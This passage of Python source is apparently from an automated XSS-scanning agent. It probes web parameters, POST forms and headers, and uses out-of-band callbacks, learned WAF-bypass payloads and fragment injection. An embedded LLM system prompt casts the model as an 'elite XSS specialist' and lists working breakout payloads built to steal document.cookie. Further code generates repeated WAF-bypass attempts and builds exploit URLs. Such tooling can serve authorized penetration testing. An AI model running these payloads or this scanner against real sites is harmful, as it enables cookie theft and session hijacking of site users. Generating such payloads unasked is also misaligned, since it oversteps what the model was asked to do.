                            logger.info(f"[{self.name}] ⚡ OPTIMIZATION: Early exit enabled (config)")
                            logger.info(f"[{self.name}] Skipping {remaining} remaining params (URL already vulnerable)")
                            dashboard.log(f"[{self.name}] ⚡ Early exit: Skipping {remaining} params (optimization)", "INFO")
                        break

            # Phase 3.5: DOM XSS (Headless Playwright)
            dashboard.log(f"[{self.name}] 🎭 Starting DOM XSS Headless Scan...", "INFO")
            logger.info(f"[{self.name}] Phase 3.5: DOM XSS Headless Scan")
            try:
                dom_findings = await detect_dom_xss(self.url)
                for df in dom_findings:
                    # Convert to XSSFinding
                    self.findings.append(XSSFinding(
                        url=df["url"],
                        parameter=df["source"],
                        payload=df["payload"],
                        context="dom_xss",
                        validation_method="headless_playwright",
                        evidence={"sink": df["sink"], "evidence": df["evidence"]},
                        confidence=1.0,
                        status="VALIDATED_CONFIRMED",
                        validated=True,
                        reflection_context=df["source"],
                        successful_payloads=[df["payload"]]
                    ))
                if dom_findings:
                    dashboard.log(f"[{self.name}] 🎯 DOM XSS CONFIRMED ({len(dom_findings)} hits)!", "SUCCESS")
                    logger.info(f"[{self.name}] DOM XSS Headless Scan found {len(dom_findings)} vulnerabilities")
            except Exception as e:
                logger.error(f"[{self.name}] DOM XSS Headless Scan failed: {e}", exc_info=True)
                dashboard.log(f"[{self.name}] ⚠️ DOM XSS Scan skipped: Headless error", "WARN")

            # Phase 4: Additional Attack Vectors (POST, Headers)
            if not self._max_impact_achieved:
                # 4.1: Test POST forms
                dashboard.log(f"[{self.name}] 📝 Phase 4.1: Testing POST forms...", "INFO")
                try:
                    post_findings = await self._discover_and_test_post_forms(
                        interactsh_domain, screenshots_dir
                    )
                    for pf in post_findings:
                        self.findings.append(pf)
                        if self._max_impact_achieved:
                            break
                    if post_findings:
                        dashboard.log(f"[{self.name}] 🎯 POST XSS found: {len(post_findings)} hits!", "SUCCESS")
                except Exception as e:
                    logger.debug(f"POST form testing failed: {e}")

                # 4.2: Test Header Injection
                if not self._max_impact_achieved:
                    dashboard.log(f"[{self.name}] 🔧 Phase 4.2: Testing header injection...", "INFO")
                    try:
                        header_finding = await self._test_header_injection(
                            interactsh_domain, screenshots_dir
                        )
                        if header_finding:
                            self.findings.append(header_finding)
                            dashboard.log(f"[{self.name}] 🎯 Header XSS found!", "SUCCESS")
                    except Exception as e:
                        logger.debug(f"Header injection testing failed: {e}")

            # Phase 5: Cleanup
            if self.interactsh:
                await self.interactsh.deregister()
            
            # Return results
            validated_count = len(self.findings)
            logger.info(f"[{self.name}] Returning {validated_count} findings.")
            dashboard.log(f"[{self.name}] ✅ Scan complete. {validated_count} XSS found.", "SUCCESS")
            
            return {
                "findings": [self._finding_to_dict(f) for f in self.findings],
                "validated_count": validated_count,
                "params_tested": len(self.params)
            }
            
        except Exception as e:
            logger.exception(f"XSSAgent error: {e}")
            dashboard.log(f"[{self.name}] ❌ Error: {e}", "ERROR")
            return {"findings": [], "error": str(e)}


    async def _probe_and_analyze_context(
        self, param: str
    ) -> Tuple[Optional[str], Optional[str], int, Dict, str, str, Dict]:
        """Phase 1: Probe parameter and analyze context."""
        # Probe to get HTML with reflection and analyze context
        html, probe_url, status_code = await self._probe_parameter(param)

        # Use framework's WAF detection
        waf_detected = self._detected_waf is not None
        if html == "":
            dashboard.log(f"[{self.name}] 🛡️ WAF Detected (Probe Blocked). Switching to Direct Fire Strategy.", "WARN")
            waf_detected = True
            html = "<html><body>WAF_BLOCKED_PROBE</body></html>"

        if html is None:
            return None, None, 0, {}, "", "", {}

        # Analyze context
        global_context = self._analyze_global_context(html)
        dashboard.log(f"[{self.name}] 🌍 Global Context: {global_context}", "INFO")

        context_data = self._analyze_reflection_context(html, self.PROBE_STRING)
        context_data["global_context"] = global_context

        # Determine reflection type
        if not context_data.get("reflected"):
            if context_data.get("is_blocked"):
                reflection_type = "waf_blocked"
                surviving_chars = "unknown"
            else:
                reflection_type = "unknown (potential DOM XSS)"
                surviving_chars = "unknown"
        else:
            reflection_type = context_data.get("context", "unknown")
            surviving_chars = context_data.get("surviving_chars", "")

        # Get injection context for reporting
        injection_ctx = self.detect_injection_context(html, self.PROBE_STRING)
        server_escaping = await self.analyze_server_escaping(self.url, param)

        return html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx

    async def _test_smart_llm_payloads(
        self,
        param: str,
        html: str,
        context_data: Dict,
        interactsh_url: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Phase 2: Test LLM-generated smart payloads."""
        if not context_data.get("reflected", False):
            return None

        dashboard.log(f"[{self.name}] 🧠 LLM Brain: Analyzing DOM structure...", "INFO")

        smart_payloads = await self._llm_smart_dom_analysis(
            html=html,
            param=param,
            probe_string=self.PROBE_STRING,
            interactsh_url=interactsh_url,
            context_data=context_data
        )

        if not smart_payloads:
            return None

        dashboard.log(f"[{self.name}] 🎯 Testing {len(smart_payloads)} LLM-generated precision payloads", "INFO")

        for sp in smart_payloads:
            if self._max_impact_achieved:
                break

            payload = sp["payload"]
            dashboard.set_current_payload(payload[:60], "XSS Smart", "Testing")

            response_html = await self._send_payload(param, payload)
            if not response_html:
                continue

            validated, evidence = await self._validate(
                param, payload, response_html, "interactsh", screenshots_dir
            )

            if validated:
                finding_data = {
                    "evidence": evidence,
                    "screenshot_path": evidence.get("screenshot_path"),
                    "context": sp.get("reasoning", "LLM Smart Analysis"),
                    "reflection_context": reflection_type
                }

                if self._should_create_finding(finding_data):
                    return self._create_xss_finding(
                        param, payload, sp.get("reasoning", "LLM Smart Analysis"),
                        "llm_smart_analysis", evidence, sp.get("confidence", 0.9),
                        reflection_type, surviving_chars, [payload],
                        injection_ctx, "context_aware_payload",
                        sp.get("reasoning", "LLM generated specific payload for this context.")
                    )

        return None

    async def _test_hybrid_payloads(
        self,
        param: str,
        interactsh_url: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        context_data: Dict,
        status_code: int,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Phase 3: Test hybrid payloads (Learned + Curated + Golden)."""
        # Get prioritized payloads
        raw_payloads = self.payload_learner.get_prioritized_payloads(self.GOLDEN_PAYLOADS)
        hybrid_payloads = self._filter_payloads_by_context(raw_payloads, reflection_type)

        # Adaptive batching
        from bugtrace.agents.payload_batches import payload_batcher, ProbeResult

        waf_detected = self._detected_waf is not None or context_data.get("is_blocked", False)
        probe_result = ProbeResult(
            reflected=context_data.get("reflected", False),
            surviving_chars=surviving_chars,
            waf_detected=waf_detected,
            waf_name=self._detected_waf,
            context=reflection_type,
            status_code=status_code
        )

        # Get adaptive payloads
        current_batch = "universal"
        tested_batches = set()
        hybrid_payloads = []

        while current_batch and current_batch not in tested_batches and len(hybrid_payloads) < 100:
            tested_batches.add(current_batch)

            new_payloads = payload_batcher.get_batch(current_batch)
            filtered_batch = self._filter_payloads_by_context(new_payloads, reflection_type)
            hybrid_payloads.extend(filtered_batch)

            current_batch = payload_batcher.decide_escalation(probe_result, tested_batches)

        if not hybrid_payloads:
            hybrid_payloads = self._filter_payloads_by_context(raw_payloads, reflection_type)[:50]

        # Q-Learning WAF bypass
        if self._detected_waf:
            original_count = len(hybrid_payloads)
            hybrid_payloads = await self._get_waf_optimized_payloads(hybrid_payloads, max_variants=3)
            logger.info(f"[{self.name}] 🧠 Q-Learning WAF bypass: {original_count} → {len(hybrid_payloads)} payloads")

        logger.info(f"[{self.name}] ⚡ Adaptive Strategy: Testing {len(hybrid_payloads)} payloads for {param}...")

        # Test payloads
        return await self._test_payload_list(
            param, hybrid_payloads, interactsh_url, screenshots_dir,
            reflection_type, surviving_chars, injection_ctx
        )

    async def _test_payload_list(
        self,
        param: str,
        hybrid_payloads: List[str],
        interactsh_url: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Test a list of payloads and return first successful finding."""
        successful_payloads = []
        best_evidence = None
        best_payload = None
        best_finding_data = None

        # Fast reflection check using Go fuzzer
        valid_payloads = [p.replace("{{interactsh_url}}", interactsh_url) for p in hybrid_payloads]
        reflection_results = await self._fast_reflection_check(self.url, param, valid_payloads)

        if reflection_results:
            for ref in reflection_results:
                if self._max_impact_achieved:
                    break

                reflected_payload = ref["payload"]
                is_encoded = ref.get("encoded", True)
                ref_context = ref.get("context", "unknown")

                dashboard.set_current_payload(reflected_payload[:60], "XSS Hybrid", "Validating")

                # Authority check for unencoded dangerous reflections
                if not is_encoded and ref_context in ["html_text", "attribute_unquoted"]:
                    return self._create_authority_finding(
                        param, reflected_payload, ref_context, injection_ctx
                    )

                # Browser validation
                validated, evidence = await self._validate(
                    param, reflected_payload, "", "interactsh", screenshots_dir
                )

                if validated:
                    finding_data = {
                        "evidence": evidence,
                        "screenshot_path": evidence.get("screenshot_path"),
                        "context": "hybrid_payload",
                        "reflection_context": reflection_type
                    }

                    if self._should_create_finding(finding_data):
                        self.payload_learner.save_success(reflected_payload, reflection_type, self.url)
                        successful_payloads.append(reflected_payload)

                        if not best_payload:
                            best_payload = reflected_payload
                            best_evidence = evidence
                            best_finding_data = finding_data

                        should_stop, stop_reason = self._should_stop_testing(
                            reflected_payload, evidence, len(successful_payloads)
                        )
                        if should_stop:
                            break

        if successful_payloads:
            return self._create_xss_finding(
                param, best_payload, best_finding_data.get("context", "hybrid_payload"),
                "interactsh", best_evidence, 1.0,
                reflection_type, surviving_chars, successful_payloads,
                injection_ctx, "hybrid_optimized",
                "Hybrid strategy found a working payload from known patterns."
            )

        return None

    def _create_xss_finding(
        self, param: str, payload: str, context: str, validation_method: str,
        evidence: Dict, confidence: float, reflection_type: str, surviving_chars: str,
        successful_payloads: List[str], injection_ctx: Any, bypass_technique: str,
        bypass_explanation: str
    ) -> XSSFinding:
        """Create an XSSFinding with all required fields."""
        status, validated = self._determine_validation_status({"evidence": evidence})

        return XSSFinding(
            url=self.url,
            parameter=param,
            payload=payload,
            context=context,
            validation_method=validation_method,
            evidence=evidence,
            confidence=confidence,
            status=status,
            validated=validated,
            screenshot_path=evidence.get("screenshot_path"),
            reflection_context=reflection_type,
            surviving_chars=surviving_chars,
            successful_payloads=successful_payloads,
            xss_type="reflected",
            injection_context_type=injection_ctx.type,
            vulnerable_code_snippet=injection_ctx.code_snippet,
            server_escaping=getattr(self, '_last_server_escaping', {}),
            escape_bypass_technique=bypass_technique,
            bypass_explanation=bypass_explanation,
            exploit_url=self.build_exploit_url(self.url, param, payload, encoded=False),
            exploit_url_encoded=self.build_exploit_url(self.url, param, payload, encoded=True),
            verification_methods=self.generate_verification_methods(self.url, param, injection_ctx, payload),
            verification_warnings=self.get_verification_warnings(injection_ctx),
            reproduction_steps=self.generate_repro_steps(self.url, param, injection_ctx, payload)
        )

    def _create_authority_finding(
        self, param: str, payload: str, ref_context: str, injection_ctx: Any
    ) -> XSSFinding:
        """Create finding for authority-confirmed XSS (unencoded reflection)."""
        evidence = {
            "payload": payload,
            "unencoded_reflection": True,
            "reflection_context": ref_context,
            "description": f"Reflected without encoding in {ref_context} context (Go Fuzzer Authority)."
        }

        return XSSFinding(
            url=self.url,
            parameter=param,
            payload=payload,
            context="reflected_unencoded",
            validation_method="go_fuzzer_authority",
            evidence=evidence,
            confidence=1.0,
            status="VALIDATED_CONFIRMED",
            reflection_context=ref_context,
            xss_type="reflected",
            injection_context_type=injection_ctx.type,
            vulnerable_code_snippet=injection_ctx.code_snippet,
            server_escaping=getattr(self, '_last_server_escaping', {}),
            escape_bypass_technique="none_needed",
            bypass_explanation="Payload was reflected without encoding.",
            exploit_url=self.build_exploit_url(self.url, param, payload, encoded=False),
            exploit_url_encoded=self.build_exploit_url(self.url, param, payload, encoded=True),
            verification_methods=self.generate_verification_methods(self.url, param, injection_ctx, payload),
            verification_warnings=self.get_verification_warnings(injection_ctx),
            reproduction_steps=self.generate_repro_steps(self.url, param, injection_ctx, payload)
        )

    async def _test_parameter(
        self,
        param: str,
        interactsh_domain: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """Test a single parameter for XSS."""
        dashboard.log(f"[{self.name}] 🔬 Testing param: {param}", "INFO")
        dashboard.set_status("XSS Analysis", f"Testing {param}")

        # Phase 1: Probe and analyze context
        probe_result = await self._probe_and_analyze_context(param)
        if probe_result[0] is None:
            return None

        html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx = probe_result

        # Cache server escaping for finding creation
        self._last_server_escaping = await self.analyze_server_escaping(self.url, param)

        # Get interactsh URL
        interactsh_url = self.interactsh.get_payload_url("xss", param)

        # Phase 2: LLM Smart DOM Analysis (Primary Strategy)
        smart_finding = await self._test_smart_llm_payloads(
            param, html, context_data, interactsh_url, screenshots_dir,
            reflection_type, surviving_chars, injection_ctx
        )
        if smart_finding:
            return smart_finding

        # Phase 3: Hybrid Payloads (Fallback)
        hybrid_finding = await self._test_hybrid_payloads(
            param, interactsh_url, screenshots_dir, reflection_type,
            surviving_chars, context_data, status_code, injection_ctx
        )
        if hybrid_finding:
            return hybrid_finding

        # Phase 4: Fragment XSS (Special case for WAF bypass)
        should_try_fragment = (
            self.consecutive_blocks > 2 or
            not context_data.get("reflected") or
            self._detected_waf is not None
        )

        if should_try_fragment:
            dashboard.log(f"[{self.name}] 🔗 Trying FRAGMENT XSS (Heuristic)...", "WARN")

            fragment_payloads = [
                fp.replace("{{interactsh_url}}", interactsh_url)
                for fp in self.FRAGMENT_PAYLOADS
            ]

            if fragment_payloads:
                return XSSFinding(
                    url=self.url,
                    parameter=param,
                    payload=fragment_payloads[0],
                    context="fragment_xss_potential",
                    validation_method="cdp_pending",
                    evidence={
                        "reason": "WAF blocked query params, fragment bypass needs CDP validation",
                        "all_payloads": fragment_payloads,
                        "needs_cdp": True
                    },
                    confidence=0.7,
                    status="PENDING_CDP_VALIDATION",
                    validated=False,
                    reflection_context="fragment",
                    successful_payloads=fragment_payloads,
                    xss_type="dom-based",
                    injection_context_type="url_fragment",
                    vulnerable_code_snippet="location.hash sink",
                    server_escaping=self._last_server_escaping,
                    escape_bypass_technique="fragment_injection",
                    bypass_explanation="Payload injected via URL fragment to avoid server-side WAF.",
                    exploit_url=self.build_exploit_url(self.url, param, fragment_payloads[0], encoded=False),
                    exploit_url_encoded=self.build_exploit_url(self.url, param, fragment_payloads[0], encoded=True),
                    verification_methods=[{
                        "type": "cdp",
                        "name": "Browser Verification",
                        "instructions": "Must use browser",
                        "url_encoded": self.build_exploit_url(self.url, param, fragment_payloads[0], encoded=True)
                    }],
                    verification_warnings=["Fragment XSS requires browser interaction"],
                    reproduction_steps=["Open URL in browser", "Check for execution"]
                )

        # Phase 5: LLM Analysis (Expensive fallback)
        if not context_data.get("reflected") and not self._detected_waf:
            logger.info(f"[{self.name}] ⚡ OPTIMIZATION: Skipping LLM analysis")
            return None

        llm_response = await self.exec_tool("LLM_Analysis", self._llm_analyze, html, param, interactsh_url, context_data, timeout=250)

        if not llm_response or not llm_response.get("vulnerable"):
            return None

        payload = llm_response.get("payload", "")
        validation_method = llm_response.get("validation_method", "interactsh")

        dashboard.set_current_payload(payload[:60], "XSS", "Testing")

        response_html = await self._send_payload(param, payload)
        if not response_html:
            return None

        validated, evidence = await self._validate(
            param, payload, response_html, validation_method, screenshots_dir
        )

        if validated:
            finding_data = {
                "evidence": evidence,
                "screenshot_path": evidence.get("screenshot_path"),
                "context": llm_response.get("context", "unknown"),
                "reflection_context": reflection_type
            }

            if not self._should_create_finding(finding_data):
                return None

            return self._create_xss_finding(
                param, payload, llm_response.get("context", "unknown"),
                validation_method, evidence, llm_response.get("confidence", 0.9),
                reflection_type, surviving_chars, [payload],
                injection_ctx, "context_aware",
                llm_response.get("reasoning", "LLM generated context-aware payload.")
            )

        # Phase 6: Bypass attempts
        waf_active = self.consecutive_blocks > 2 or self._detected_waf is not None
        max_attempts = self.MAX_BYPASS_ATTEMPTS if waf_active else 2

        for attempt in range(max_attempts):
            bypass_response = await self._llm_generate_bypass(
                payload, response_html[:50000], interactsh_url
            )

            if not bypass_response or not bypass_response.get("bypass_payload"):
                break

            bypass_payload = bypass_response.get("bypass_payload")
            dashboard.set_current_payload(bypass_payload[:60], "XSS Bypass", "Testing")

            response_html = await self._send_payload(param, bypass_payload)
            validated, evidence = await self._validate(
                param, bypass_payload, response_html, validation_method, screenshots_dir
            )

            if validated:
                finding_data = {
                    "evidence": evidence,
                    "screenshot_path": evidence.get("screenshot_path"),
                    "context": bypass_response.get("strategy", "bypass"),
                    "reflection_context": reflection_type
                }

                if not self._should_create_finding(finding_data):
                    continue

                return self._create_xss_finding(
                    param, bypass_payload, bypass_response.get("strategy", "bypass"),
                    validation_method, evidence, 0.95,
                    reflection_type, surviving_chars, [bypass_payload],
                    injection_ctx, "waf_bypass",
                    bypass_response.get("reasoning", "LLM generated WAF bypass.")
                )

        return None


    def _clean_payload(self, payload: str, param: str) -> str:
        """
        Cleans the payload by removing common hallucinations and LLM pollution.
        """
        if not payload:
            return ""
            
        import re
        cleaned = payload.strip()
        
        # 1. Remove Markdown code blocks (```javascript ... ``` or ```html ... ```)
        cleaned = re.sub(r'```[a-z]*\n?(.*?)\n?```', r'\1', cleaned, flags=re.DOTALL)
        
        # 2. Remove inline code backticks
        cleaned = cleaned.strip('`')
        
        # 3. Remove common prefixes like "Payload:", "Vector:", "**Second**:", etc.
        cleaned = re.sub(r'^(payload|vector|bypass|solution|new payload|\*\*.*?\*\*)\s*:\s*', '', cleaned, flags=re.IGNORECASE)
        
        # 4. Remove param prefix hallucination (e.g. searchTerm=...)
        param_pattern = re.compile(f"^{re.escape(param)}=", re.IGNORECASE)
        cleaned = param_pattern.sub("", cleaned).strip()
        
        # 5. Remove any leftover XML tags that XmlParser might have missed in a messy response
        cleaned = re.sub(r'</?payload>', '', cleaned, flags=re.IGNORECASE)
        
        # 6. Final strip of quotes
        if (cleaned.startswith('"') and cleaned.endswith('"')) or \
           (cleaned.startswith("'") and cleaned.endswith("'")):
            cleaned = cleaned[1:-1]
            
        return cleaned

    def _is_valid_url(self, url: str) -> bool:
        """Validate URL before making requests. (Stability Improvement #3)"""
        from urllib.parse import urlparse
        try:
            result = urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except Exception as e:
            logger.debug(f"_is_valid_url failed: {e}")
            return False

    async def _probe_parameter(self, param: str) -> Tuple[str, str, int]:
        """Send probe string and get HTML response."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(self.url)
        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
        params[param] = self.PROBE_STRING
        
        probe_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params), parsed.fragment
        ))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(probe_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    html = await resp.text()
                    logger.info(f"[{self.name}] Probe status: {resp.status} for {probe_url}")
                    return html, probe_url, resp.status
        except Exception as e:
            logger.warning(f"[{self.name}] Probe failed (WAF suspected) for {probe_url}: {e}")
            # If probe fails (WAF drops connection or blocks), we return specific flags
            # allowing the main loop to try "Stealth Mode" or "Blind Golden Payloads"
            # Return empty HTML but valid URL to ensure the loop continues
            return "", probe_url, 0

    def _analyze_reflection_context(self, html: str, probe_prefix: str) -> Dict:
        """
        Analyze the reflection point of the probe.
        Advanced context analysis technique.
        """
        prefix = "BT7331"
        is_blocked = self._is_waf_blocked(html)

        # Early return if probe not reflected
        if prefix not in html:
            return {
                "reflected": False,
                "is_blocked": is_blocked,
                "context": "blocked" if is_blocked else "none"
            }

        # Detect surviving characters
        surviving = self._detect_surviving_chars(html, prefix)

        # Find context via BeautifulSoup
        context = self._find_reflection_context(html, prefix)

        return {
            "reflected": True,
            "context": context,
            "probe_found": True,
            "surviving_chars": surviving,
            "is_blocked": is_blocked
        }

    def _is_waf_blocked(self, html: str) -> bool:
        """Check if response contains WAF block signatures."""
        lower_html = html.lower()
        block_signatures = ["blocked:", "waf block", "security violation", "forbidden", "not acceptable", "access denied"]
        return any(sig in lower_html for sig in block_signatures)

    def _detect_surviving_chars(self, html: str, prefix: str) -> str:
        """Detect which special characters survived reflection."""
        test_chars = ["'", "\"", "<", ">", "&", "{", "}", "\\"]
        surviving = ""
        for char in test_chars:
            if f"{prefix}{char}" in html or (char in html and prefix in html):
                surviving += char
        return surviving

    def _find_reflection_context(self, html: str, prefix: str) -> str:
        """Find the HTML context where the probe was reflected."""
        from bs4 import BeautifulSoup

        try:
            soup = BeautifulSoup(html, 'html.parser')
            text_node = soup.find(string=lambda t: t and prefix in t)

            if text_node:
                return self._context_from_text_node(text_node)
            else:
                return self._context_from_attributes(html, prefix)

        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return "unknown"

    def _context_from_text_node(self, text_node) -> str:
        """Determine context from text node parent."""
        parent = text_node.parent.name
        if parent in ['script', 'style']:
            return parent
        return "html_text"

    def _context_from_attributes(self, html: str, prefix: str) -> str:
        """Determine context from attribute heuristics."""
        if f"={prefix}" in html or f'="{prefix}' in html or f"='{prefix}" in html:
            return "attribute_value"
        elif f"<!-- {prefix}" in html or f"<!--{prefix}" in html:
            return "comment"
        elif f"<{prefix}" in html:
            return "tag_name"
        return "unknown"
    def _filter_payloads_by_context(self, payloads: List[str], context: str) -> List[str]:
        """
        Filters and prioritizes payloads based on the detected reflection context.
        This prevents testing 800+ payloads when only ~50 are relevant.
        """
        # For unknown/blocked contexts, use broader set
        if context.startswith("unknown") or context in ["waf_blocked", "blocked"]:
            return payloads[:100]

        # Filter by context relevance
        filtered = [p for p in payloads if self._is_payload_relevant(p, context)]

        # Add safety net of top killer payloads
        filtered = self._add_safety_net_payloads(filtered, payloads)

        # Limit to 100 max to keep it fast
        return filtered[:100]

    def _is_payload_relevant(self, payload: str, context: str) -> bool:
        """Check if payload is relevant for the given context."""
        p_lower = payload.lower()

        if context == "script":
            return self._is_relevant_for_script_context(payload, p_lower)
        if context == "html_text":
            return any(payload.startswith(x) for x in ["<", "\">", "'>", "{{", "[["])
        if context == "attribute_value":
            return any(p_lower.startswith(x) for x in ["on", "\"", "'", " javascript:", "data:"])
        if context == "comment":
            return "-->" in payload or "--!>" in payload
        if context == "style":
            return any(x in payload for x in ["</style>", "expression", "url", "'", "\""])
        if context == "tag_name":
            return any(x in payload for x in [" ", ">", "/"])

        return False

    def _has_script_breakout_chars(self, payload: str) -> bool:
        """Check if payload contains script breakout characters."""
        breakout_chars = ["'", "\"", "</script>", ";", "-", "+", "*", "\\"]
        return any(x in payload for x in breakout_chars)

    def _is_html_tag_with_breakout(self, payload: str, p_lower: str) -> bool:
        """Check if HTML tag has proper breakout."""
        if not payload.startswith("<"):
            return True  # Not HTML tag, allow
        if p_lower.startswith("</script>"):
            return True  # Script closing tag, allow
        # Check if has quote before tag (breakout)
        return any(payload.startswith(q) for q in ["'", "\"", "'; ", "\"; "])

    def _is_relevant_for_script_context(self, payload: str, p_lower: str) -> bool:
        """Check if payload is relevant for script context."""
        if not self._has_script_breakout_chars(payload):
            return False
        return self._is_html_tag_with_breakout(payload, p_lower)

    def _add_safety_net_payloads(self, filtered: List[str], all_payloads: List[str]) -> List[str]:
        """Add top killer payloads as safety net if not already included."""
        safety_net = all_payloads[:10]
        for sn in safety_net:
            if sn not in filtered:
                filtered.append(sn)
        return filtered


    def _analyze_global_context(self, html: str) -> str:
        """
        Analyze the full HTML for global technology signatures (Angular, React, Vue, jQuery).
        This provides 'Sniper' context for frameworks.
        """
        if not html:
            return "No HTML content"
            
        context = []
        lower_html = html.lower()
        
        # AngularJS 1.x
        if "ng-app" in lower_html or "angular.js" in lower_html or "angular.min.js" in lower_html or "angular_1" in lower_html:
            context.append("AngularJS (CSTI Risk!)")
            
        # React
        if "react" in lower_html and "component" in lower_html:
            context.append("React")
            
        # Vue
        if "vue.js" in lower_html or "vue.min.js" in lower_html or "v-if" in lower_html:
            context.append("Vue.js")
            
        # jQuery
        if "jquery" in lower_html:
            context.append("jQuery")
            
        return ", ".join(context) if context else "Vanilla JS / Unknown"

    # =========================================================================
    # LLM AS BRAIN: Smart DOM Analysis (Primary Strategy)
    # =========================================================================

    async def _llm_smart_dom_analysis(
        self,
        html: str,
        param: str,
        probe_string: str,
        interactsh_url: str,
        context_data: Dict
    ) -> List[Dict]:
        """
        LLM-First Strategy: Analyze DOM structure and generate targeted payloads.

        Instead of trying 50+ generic payloads, the LLM:
        1. Parses the exact DOM structure around the reflection point
        2. Identifies what tags/attributes need to be escaped
        3. Generates 1-3 precision payloads for the exact context

        Returns:
            List of payload dicts with: payload, reasoning, confidence
        """
        import json

        # Extract the DOM snippet around the reflection point (more focused than full HTML)
        dom_snippet = self._extract_dom_around_reflection(html, probe_string)

        system_prompt = """You are an elite XSS specialist. Your job is to analyze HTML and generate PRECISE payloads.

CRITICAL: You must understand the EXACT DOM structure to escape correctly.

Example 1 - Inside a div:
```html
<div class="container"><span>USER_INPUT</span></div>
```
Correct payload: `</span></div><script>alert(document.cookie)</script>`
Why: Must close </span> AND </div> before injecting script.

Example 2 - Inside an attribute:
```html
<input value="USER_INPUT" type="text">
```
Correct payload: `" onfocus="alert(document.cookie)" autofocus x="`
Why: Close the value attribute, inject event handler, autofocus triggers it.

Example 3 - Inside JavaScript string:
```html
<script>var x = "USER_INPUT";</script>
```
Correct payload: `";alert(document.cookie);//`
Why: Close string, inject code, comment out rest.

Example 4 - Inside JavaScript with escaping:
```html
<script>var x = 'USER_INPUT';</script>
```
If backslash survives: `\';alert(document.cookie);//`
If not: Try closing script tag: `</script><script>alert(document.cookie)</script>`

RULES:
1. ALWAYS analyze the exact DOM structure first
2. Identify ALL tags that need closing before your payload
3. Generate payloads that include document.cookie or document.domain for maximum impact
4. If < > are filtered, use event handlers or javascript: protocol
5. Generate 1-3 payloads ranked by likelihood of success"""

        user_prompt = f"""Analyze this HTML and generate XSS payloads:

TARGET URL: {self.url}
PARAMETER: {param}
PROBE STRING: {probe_string}
CALLBACK URL (for OOB validation): {interactsh_url}

REFLECTION CONTEXT:
- Type: {context_data.get('context', 'unknown')}
- Surviving characters: {context_data.get('surviving_chars', 'unknown')}
- In blocked/WAF: {context_data.get('is_blocked', False)}

DOM SNIPPET (around reflection point):
```html
{dom_snippet}
```

FULL HTML (for context):
```html
{html[:8000]}
```

Generate 1-3 PRECISE XSS payloads. For each payload explain:
1. What tags/attributes need to be escaped
2. Why this specific payload will work
3. Expected impact (cookie theft, domain access, etc.)

Response format (XML):
<analysis>Your DOM structure analysis</analysis>
<payloads>
  <payload>
    <code>THE_PAYLOAD_HERE</code>
    <reasoning>Why it works</reasoning>
    <impact>cookie_theft|domain_access|execution</impact>
    <confidence>0.0-1.0</confidence>
  </payload>
  <!-- More payloads if needed -->
</payloads>"""

        try:
            response = await llm_client.generate(
                prompt=user_prompt,
                module_name="XSS_SMART_ANALYSIS",
                system_prompt=system_prompt,
                model_override=settings.MUTATION_MODEL,
                max_tokens=4000,
                temperature=0.3  # Lower temperature for more precise payloads
            )

            if not response:
                logger.warning(f"[{self.name}] LLM Smart Analysis returned empty response")
                return []

            # Parse the response
            payloads = self._parse_smart_analysis_response(response, interactsh_url)

            if payloads:
                logger.info(f"[{self.name}] 🧠 LLM Brain generated {len(payloads)} precision payloads")
                for i, p in enumerate(payloads):
                    dashboard.log(
                        f"[{self.name}] 🎯 Smart Payload #{i+1}: {p['payload'][:50]}... (conf: {p['confidence']})",
                        "INFO"
                    )

            return payloads

        except Exception as e:
            logger.error(f"[{self.name}] LLM Smart Analysis failed: {e}", exc_info=True)
            return []

    def _extract_dom_around_reflection(self, html: str, probe: str, context_chars: int = 500) -> str:
        """Extract the DOM snippet around where the probe string appears."""
        if probe not in html:
            return html[:1000]  # Fallback to first 1000 chars

        idx = html.find(probe)
        start = max(0, idx - context_chars)
        end = min(len(html), idx + len(probe) + context_chars)

        snippet = html[start:end]

        # Try to include complete tags
        if start > 0:
            # Find the last < before our snippet
            last_open = html.rfind('<', 0, start)
            if last_open != -1 and last_open > start - 200:
                snippet = html[last_open:end]

        return snippet

    def _parse_smart_analysis_response(self, response: str, interactsh_url: str) -> List[Dict]:
        """Parse the LLM's smart analysis response into payload dicts."""
        import re

        # Try structured parsing first
        payloads = self._extract_structured_payloads(response, interactsh_url)

        # Fallback to pattern extraction if structured parsing failed
        if not payloads:
            payloads = self._extract_payloads_by_patterns(response)

        # Sort by confidence (highest first) and return top 3
        payloads.sort(key=lambda x: x.get("confidence", 0), reverse=True)
        return payloads[:3]

    def _extract_structured_payloads(self, response: str, interactsh_url: str) -> List[Dict]:
        """Extract payloads from structured XML-like tags."""
        import re
        payloads = []
        payload_pattern = r'<payload>(.*?)</payload>'
        matches = re.findall(payload_pattern, response, re.DOTALL)

        for match in matches:
            payload_dict = self._parse_payload_block(match, interactsh_url)
            if payload_dict:
                payloads.append(payload_dict)

        return payloads

    def _parse_payload_block(self, block: str, interactsh_url: str) -> Optional[Dict]:
        """Parse a single payload block with code, reasoning, impact, confidence."""
        import re

        code_match = re.search(r'<code>(.*?)</code>', block, re.DOTALL)
        if not code_match:
            return None

        code = self._clean_payload(code_match.group(1).strip(), "")
        code = self._replace_callback_urls(code, interactsh_url)

        reasoning_match = re.search(r'<reasoning>(.*?)</reasoning>', block, re.DOTALL)
